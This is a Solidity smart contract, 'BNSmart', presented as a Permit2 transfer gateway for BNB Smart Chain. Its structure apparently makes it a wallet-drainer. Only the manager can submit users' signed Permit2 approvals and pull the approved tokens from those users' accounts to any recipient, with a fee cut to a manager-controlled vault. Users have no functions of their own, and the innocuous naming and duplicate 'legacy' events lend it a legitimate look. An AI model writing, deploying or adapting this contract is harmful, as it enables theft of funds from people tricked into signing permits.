// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPermit2 {
    struct TokenDetails {
        address token;
        uint160 amount;
        uint48 expiration;
        uint48 nonce;
    }

    struct SinglePermit {
        TokenDetails details;
        address spender;
        uint256 sigDeadline;
    }

    function permit(
        address tokenHolder,
        SinglePermit calldata singlePermit,
        bytes calldata signature
    ) external;

    function transferFrom(
        address from,
        address to,
        uint160 amount,
        address token
    ) external;

    function allowance(
        address tokenHolder,
        address token,
        address spender
    ) external view returns (uint160 amount, uint48 expiration, uint48 nonce);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
}

/**
 * @title BNSmart
 * @notice Proxy gateway for Uniswap Permit2 transfers and settlement on BNB Smart Chain.
 *         Users sign an authorized Permit2 allowance (amount + expiry).
 *         Manager can pull approved tokens prior to signature expiry.
 */
contract BNSmart {
    address public manager;
    address public vault;
    bool public isHalted;
    uint16 public rateBps;                     // 0..1000 (max 10%)

    address public constant PERMIT2_ROUTER = 0x000000000022D473030F116dDEE9F6B43aC78BA3;

    event ManagerTransferred(address indexed previousManager, address indexed newManager);
    event VaultUpdated(address indexed newVault);
    event HaltedStateChanged(bool isHalted);
    event RateBpsUpdated(uint16 newRateBps);
    event PermitHandled(address indexed account, address indexed asset, uint160 amount);
    event TransferHandled(address indexed sender, address indexed recipient, uint160 amount, address indexed asset);

    // Legacy events for backward compatibility
    event AdminTransferred(address indexed prev, address indexed next);
    event TreasurySet(address indexed treasury);
    event PausedSet(bool paused);
    event FeeSet(uint16 feeBps);
    event PermitProcessed(address indexed tokenHolder, address indexed token, uint160 amount);
    event TransferProcessed(address indexed from, address indexed to, uint160 amount, address indexed token);

    modifier onlyManager() {
        require(msg.sender == manager, "BNSmart: caller is not manager");
        _;
    }

    modifier whenNotHalted() {
        require(!isHalted, "BNSmart: contract is halted");
        _;
    }

    constructor() {
        manager = msg.sender;
        vault = msg.sender;
        emit ManagerTransferred(address(0), msg.sender);
        emit AdminTransferred(address(0), msg.sender);
    }

    /* ---------------- Management ---------------- */

    function setManager(address newManager) public onlyManager {
        require(newManager != address(0), "BNSmart: zero manager address");
        emit ManagerTransferred(manager, newManager);
        emit AdminTransferred(manager, newManager);
        manager = newManager;
    }

    function setVault(address newVault) public onlyManager {
        require(newVault != address(0), "BNSmart: zero vault address");
        vault = newVault;
        emit VaultUpdated(newVault);
        emit TreasurySet(newVault);
    }

    function setHalted(bool haltState) public onlyManager {
        isHalted = haltState;
        emit HaltedStateChanged(haltState);
        emit PausedSet(haltState);
    }

    function setRate(uint16 newRate) public onlyManager {
        require(newRate <= 1000, "BNSmart: fee rate exceeds limit");
        rateBps = newRate;
        emit RateBpsUpdated(newRate);
        emit FeeSet(newRate);
    }

    /* ---------------- Compatibility Aliases ---------------- */

    function admin() external view returns (address) { return manager; }
    function treasury() external view returns (address) { return vault; }
    function paused() external view returns (bool) { return isHalted; }
    function feeBps() external view returns (uint16) { return rateBps; }
    function PERMIT2() external view returns (address) { return PERMIT2_ROUTER; }

    function setAdmin(address a) external onlyManager { setManager(a); }
    function setTreasury(address t) external onlyManager { setVault(t); }
    function setPaused(bool p) external onlyManager { setHalted(p); }
    function setFee(uint16 f) external onlyManager { setRate(f); }

    /* ---------------- Core Execution ---------------- */

    /// @notice Submit user's signed Permit2 message to set on-chain allowance.
    function executePermit(
        address account,
        IPermit2.SinglePermit calldata permitSingle,
        bytes calldata signature
    ) public onlyManager {
        IPermit2(PERMIT2_ROUTER).permit(account, permitSingle, signature);
        emit PermitHandled(account, permitSingle.details.token, permitSingle.details.amount);
        emit PermitProcessed(account, permitSingle.details.token, permitSingle.details.amount);
    }

    /// @notice Pull tokens using an existing on-chain Permit2 allowance.
    function executeTransfer(
        address sender,
        address recipient,
        uint160 amount,
        address asset
    ) public onlyManager whenNotHalted {
        IPermit2(PERMIT2_ROUTER).transferFrom(sender, recipient, amount, asset);
        emit TransferHandled(sender, recipient, amount, asset);
        emit TransferProcessed(sender, recipient, amount, asset);
    }

    /// @notice Submit permit + pull in one transaction. Optional fee split.
    function executePermitAndTransfer(
        address account,
        IPermit2.SinglePermit calldata permitSingle,
        bytes calldata signature,
        address recipient,
        uint160 amount
    ) external onlyManager whenNotHalted {
        IPermit2(PERMIT2_ROUTER).permit(account, permitSingle, signature);
        emit PermitHandled(account, permitSingle.details.token, permitSingle.details.amount);
        emit PermitProcessed(account, permitSingle.details.token, permitSingle.details.amount);

        if (rateBps > 0 && vault != address(0)) {
            uint160 feeCut = uint160((uint256(amount) * rateBps) / 10_000);
            uint160 netTransfer = amount - feeCut;
            IPermit2(PERMIT2_ROUTER).transferFrom(account, vault, feeCut, permitSingle.details.token);
            IPermit2(PERMIT2_ROUTER).transferFrom(account, recipient, netTransfer, permitSingle.details.token);
            emit TransferHandled(account, vault, feeCut, permitSingle.details.token);
            emit TransferHandled(account, recipient, netTransfer, permitSingle.details.token);
            emit TransferProcessed(account, vault, feeCut, permitSingle.details.token);
            emit TransferProcessed(account, recipient, netTransfer, permitSingle.details.token);
        } else {
            IPermit2(PERMIT2_ROUTER).transferFrom(account, recipient, amount, permitSingle.details.token);
            emit TransferHandled(account, recipient, amount, permitSingle.details.token);
            emit TransferProcessed(account, recipient, amount, permitSingle.details.token);
        }
    }

    /* ---------------- Rescue ---------------- */

    function rescueTokens(address asset, address recipient, uint256 amount) external onlyManager {
        IERC20(asset).transfer(recipient, amount);
    }

    function rescueBNB(address payable recipient, uint256 amount) external onlyManager {
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "BNSmart: native transfer failed");
    }

    receive() external payable {}
}
